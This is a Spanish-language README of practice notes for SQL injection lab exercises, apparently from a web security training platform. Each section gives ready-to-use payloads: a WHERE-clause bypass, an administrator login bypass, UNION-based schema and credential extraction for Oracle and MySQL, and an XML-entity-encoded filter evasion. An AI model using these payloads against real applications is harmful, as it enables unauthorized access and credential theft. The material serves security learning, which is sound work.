# Prácticas de Web Hacking

## SQL Injection

Este repositorio contiene ejemplos prácticos de vulnerabilidades de inyección SQL y cómo explotarlas. A continuación, se describen los procedimientos para cada tipo de ataque.

---

### 1. SQL Injection en la cláusula WHERE para recuperar datos ocultos

1. Accede a una categoría en la aplicación web.
2. Modifica la URL cambiando la categoría por la cadena: `'+OR+1=1--`.
3. Accede a la URL modificada.

---

### 2. SQL Injection para bypass de login

1. Haz clic en "My account".
2. Inicia sesión usando el usuario: `administrator'--`.
3. En el campo de contraseña, ingresa cualquier valor.
4. Haz clic en "Log in".

---

### 3. SQL Injection para consultar el tipo y versión de la base de datos en Oracle

1. Accede a una categoría en la aplicación web.
2. Modifica la URL cambiando la categoría por la cadena: `'+UNION+SELECT+BANNER,+NULL+FROM+v$version--`.
3. Accede a la URL modificada.

---

### 4. SQL Injection con bypass de filtros mediante codificación XML

1. Abre las herramientas de desarrollo (F12).
2. Ve a la pestaña "Network".
3. Haz clic en los detalles de un producto.
4. Haz clic en "Check stock".
5. Copia la petición que recupera el stock como `fetch`.
6. Ve a la pestaña "Console".
7. Pega la petición.
8. Modifica el contenido de la etiqueta `storeId` por:
   ```xml
   &#x31;&#x20;&#x55;&#x4E;&#x49;&#x4F;&#x4E;&#x20;&#x53;&#x45;&#x4C;&#x45;&#x43;&#x54;&#x20;&#x75;&#x73;&#x65;&#x72;&#x6E;&#x61;&#x6D;&#x65;&#x20;&#x7C;&#x7C;&#x27;&#x7E;&#x27;&#x20;&#x7C;&#x7C;&#x20;&#x70;&#x61;&#x73;&#x73;&#x77;&#x6F;&#x72;&#x64;&#x20;&#x46;&#x52;&#x4F;&#x4D;&#x20;&#x75;&#x73;&#x65;&#x72;&#x73;
   ```
9. Ejecuta la petición.
10. Usa las credenciales que muestra el `response` para iniciar sesión como administrador.

---

### 5. SQL Injection para consultar el tipo y versión de la base de datos en MySQL y Microsoft

1. Accede a la categoría "Gifts".
2. Agrega a la URL la siguiente cadena:
   ```
   %27%20UNION%20SELECT%20%40%40version,%20%27def%27%20%23
   ```
3. Accede a la URL modificada.

---

### 6. SQL Injection para listar el contenido de la base de datos en bases no-Oracle

1. Accede a la categoría "Pets".
2. Agrega a la URL la siguiente cadena:
   ```
   '+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
   ```
3. Accede a la URL modificada para ver las tablas existentes.
4. Encuentra la tabla objetivo (por ejemplo, `users_kkyhth`).
5. Modifica la URL agregando la siguiente cadena:
   ```
   '+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_kkyhth'--
   ```
6. Accede a la URL modificada para ver las columnas de la tabla.
7. Encuentra las columnas de credenciales (por ejemplo, `username_lgajcw` y `password_ckilco`).
8. Modifica la URL agregando la siguiente cadena:
   ```
   %27+UNION+SELECT+username_lgajcw,+password_ckilco+FROM+users_kkyhth--
   ```
9. Usa las credenciales del administrador para iniciar sesión.

---

### 7. SQL Injection para listar el contenido de la base de datos en Oracle

1. **Determina el número de columnas y su tipo**:
   Usa la siguiente carga útil en el parámetro `category`:
   ```sql
   '+UNION+SELECT+'abc','def'+FROM+dual--
   ```
2. **Recupera la lista de tablas**:
   Usa la siguiente carga útil:
   ```sql
   '+UNION+SELECT+table_name,NULL+FROM+all_tables--
   ```
3. **Encuentra la tabla de credenciales**.
4. **Recupera los detalles de las columnas**:
   Usa la siguiente carga útil (reemplaza `USERS_ABCDEF` con el nombre de la tabla):
   ```sql
   '+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--
   ```
5. **Encuentra las columnas de nombres de usuario y contraseñas**.
6. **Recupera las credenciales**:
   Usa la siguiente carga útil (reemplaza los nombres de la tabla y las columnas):
   ```sql
   '+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF--
   ```

